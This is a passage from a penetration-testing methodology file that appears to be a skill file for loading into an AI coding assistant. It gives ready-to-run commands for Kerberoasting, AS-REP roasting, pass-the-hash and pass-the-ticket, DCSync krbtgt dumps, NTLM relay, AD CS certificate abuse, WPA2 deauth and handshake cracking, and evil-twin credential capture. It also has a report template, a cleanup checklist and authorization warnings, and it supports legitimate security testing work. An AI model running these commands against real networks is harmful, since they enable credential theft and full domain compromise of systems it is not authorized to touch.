hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Kerberoasting

```bash
# Request TGS tickets for service accounts
impacket-GetUserSPNs domain.local/user:password -dc-ip $DC_IP -request -outputfile kerberoast.txt
# Or PowerShell: Invoke-Kerberoast -OutputFormat Hashcat

# Crack Kerberoast hashes
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

#### Pass-the-Hash / Pass-the-Ticket

```bash
# Pass-the-Hash (PTH)
impacket-psexec -hashes :NTLM_HASH user@$TARGET_IP
crackmapexec smb $TARGET_IP -u user -H NTLM_HASH

# Pass-the-Ticket (PTT)
# Export tickets: mimikatz "sekurlsa::tickets /export"
# Import: mimikatz "kerberos::ptt ticket.kirbi"
# Or Linux: export KRB5CCNAME=/tmp/ticket.ccache
```

#### DCSync (Domain Admin → Full Credential Dump)

```bash
# Requires: Replication rights (Domain Admin or delegated)
impacket-secretsdump domain.local/admin:password@$DC_IP
# Or Mimikatz: lsadump::dcsync /domain:domain.local /all /csv

# Dump specific user (krbtgt = golden ticket)
impacket-secretsdump domain.local/admin:password@$DC_IP -just-dc-user krbtgt
```

#### NTLM Relay

```bash
# Responder — capture NTLM hashes on the network
responder -I eth0 -wrf

# ntlmrelayx — relay captured auth to another host
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay to LDAP (if LDAP signing not enforced)
impacket-ntlmrelayx -t ldap://$DC_IP --escalate-user attacker
```

#### Certificate Abuse (AD CS — ESC1-ESC8)

```bash
# Find vulnerable certificate templates
certipy find -u user@domain.local -p password -dc-ip $DC_IP -vulnerable

# ESC1: Request certificate as another user
certipy req -u user@domain.local -p password -ca CORP-CA \
  -template VulnerableTemplate -upn administrator@domain.local

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

### 6C: AD Attack Path Quick Reference

| Attack | Requires | Result |
|--------|----------|--------|
| AS-REP Roast | User list | Service account password |
| Kerberoast | Domain user creds | Service account password |
| NTLM Relay | Network position | Auth relay to other hosts |
| Pass-the-Hash | NTLM hash | Shell as that user |
| DCSync | Domain Admin (or replication rights) | ALL domain hashes |
| Golden Ticket | krbtgt hash | Persistent Domain Admin |
| Certificate abuse | Domain user + vulnerable template | Domain Admin |
| Constrained Delegation | Delegated service account | Impersonate any user |

---

## PHASE 7: WIRELESS TESTING

> **Only test wireless networks you are explicitly authorized to test.**

### 7A: Wireless Reconnaissance

```bash
# Monitor mode
airmon-ng start wlan0

# Scan for access points
airodump-ng wlan0mon
airodump-ng wlan0mon --band abg  # Include 5GHz

# Target specific AP
airodump-ng wlan0mon -c CHANNEL --bssid TARGET_BSSID -w capture
```

### 7B: WPA2 Attacks

```bash
# Capture WPA2 handshake
# 1. Monitor the target AP
airodump-ng wlan0mon -c CHANNEL --bssid TARGET_BSSID -w capture

# 2. Deauth a client to force reconnection (captures handshake)
aireplay-ng -0 5 -a TARGET_BSSID -c CLIENT_MAC wlan0mon

# 3. Wait for "WPA handshake: XX:XX:XX:XX:XX:XX" in airodump

# 4. Crack the handshake
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# Or with hashcat (GPU — much faster):
hcxpcapngtool capture-01.cap -o hash.hc22000
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# PMKID attack (no client needed — clientless capture)
hcxdumptool -i wlan0mon --enable_status=1 -o capture.pcapng
hcxpcapngtool capture.pcapng -o hash.hc22000
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

### 7C: Evil Twin / Rogue AP

```bash
# Create rogue AP mimicking target
hostapd-mana hostapd.conf
# With captive portal to capture credentials

# DNS spoofing for credential capture
dnsspoof -i at0 -f spoofhosts.txt
```

---

## PHASE 8: REPORTING

### Report Structure

```markdown
# Penetration Test Report

## Executive Summary
[1 page: scope, timeline, critical findings count, overall risk rating]

## Methodology
[Testing approach, tools used, phases executed]

## Scope
[IP ranges, domains, testing window, limitations]

## Findings Summary

| # | Title | Severity | CVSS | Host(s) |
|---|-------|---------|------|---------|
| 1 | [Finding] | Critical | 9.8 | 10.10.10.5 |
| 2 | [Finding] | High | 8.1 | 10.10.10.10 |

## Detailed Findings

### Finding 1: [Title]
**Severity:** Critical
**CVSS 3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**Affected Host(s):** 10.10.10.5
**Port/Service:** 445/SMB

**Description:**
[What the vulnerability is and why it matters]

**Evidence:**
[Screenshots, command output, proof of exploitation]

**Impact:**
[Business impact — what an attacker could do]

**Remediation:**
[Specific fix with priority level]

## Attack Narrative
[Story-format walkthrough of the kill chain: initial access → privesc → lateral movement → objective]

## Remediation Summary
[Prioritized list of all fixes]

## Appendices
- Appendix A: Full nmap scan results
- Appendix B: Tools used
- Appendix C: Credentials discovered (deliver securely)
```

### Severity Ratings

| Severity | CVSS | Criteria |
|----------|------|----------|
| Critical | 9.0-10.0 | RCE, Domain Admin, unauthenticated mass exploitation |
| High | 7.0-8.9 | Authenticated RCE, credential theft, privilege escalation |
| Medium | 4.0-6.9 | Information disclosure, limited access, requires interaction |
| Low | 0.1-3.9 | Minor info leak, requires local access, minimal impact |
| Info | 0.0 | Best practice, hardening recommendation, no direct exploit |

---

## CLEANUP CHECKLIST

```
[ ] Remove all uploaded tools/scripts from target systems
[ ] Remove all created user accounts
[ ] Remove all persistence mechanisms (backdoors, scheduled tasks)
[ ] Remove all downloaded files from attacker machine (if required)
[ ] Clear command history on compromised hosts (if required by engagement rules)
[ ] Restore any modified configurations
[ ] Document all changes made to target systems
[ ] Securely transfer/delete any captured credentials
[ ] Notify client of all persistent access (shells, credentials, accounts)
```

---

## ANTI-PATTERNS — DON'T DO THESE

```
Testing without written authorization (this is a crime)
Running exploits before understanding what they do
Using kernel exploits on production systems without approval
Scanning at maximum speed (noisy, may crash services)
Forgetting UDP ports (SNMP, DNS, TFTP are goldmines)
Skipping enumeration and jumping straight to exploitation
Not documenting your steps (proof is everything)
Using tools you don't understand (know what every flag does)
Leaving backdoors/shells on client systems
Exfiltrating real data to external servers
```

---

## TOOL REFERENCE

| Phase | Tool | Purpose |
|-------|------|---------|
| Discovery | nmap, masscan, arp-scan | Host & port discovery |
| Enumeration | enum4linux, smbmap, ldapsearch, snmpwalk | Service enumeration |
| Web | nikto, gobuster, ffuf, whatweb, sslscan | Web service testing |
| Vuln Scan | nmap NSE, nuclei, searchsploit | Vulnerability identification |
| Passwords | hydra, crackmapexec, hashcat, john | Credential attacks |
| Exploitation | Metasploit, impacket, evil-winrm | Gaining access |
| Privesc | LinPEAS, WinPEAS, GTFOBins | Privilege escalation |
| AD | BloodHound, Rubeus, Certipy, Mimikatz | Active Directory |
| Pivoting | chisel, SSH tunnels, proxychains | Network traversal |
| Wireless | aircrack-ng, hcxtools, hostapd-mana | Wireless testing |
| Reporting | screenshots, CherryTree, Obsidian | Documentation |

---

## RESOURCES

| Resource | Use |
|----------|-----|
| [GTFOBins](https://gtfobins.github.io/) | Linux binary privesc |
| [LOLBAS](https://lolbas-project.github.io/) | Windows binary abuse |
| [HackTricks](https://book.hacktricks.xyz) | Full methodology reference |
| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) | Payloads & techniques |
| [PEASS-ng](https://github.com/peass-ng/PEASS-ng) | LinPEAS/WinPEAS |
| [Impacket](https://github.com/fortra/impacket) | Windows network tools |
| [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) | Network swiss army knife |
| [Certipy](https://github.com/ly4k/Certipy) | AD certificate attacks |

---

## INSTALLATION

```bash
# Add to Claude Code skills
mkdir -p ~/.claude/skills/netbreach
cp SKILL.md ~/.claude/skills/netbreach/SKILL.md

# Or link from repo
ln -s $(pwd)/skills/netbreach/SKILL.md ~/.claude/skills/netbreach/SKILL.md
```

Then use in Claude Code: ask about "network pentest", "scan this host", "enumerate SMB", "privilege escalation", "Active Directory attack", or "lateral movement".
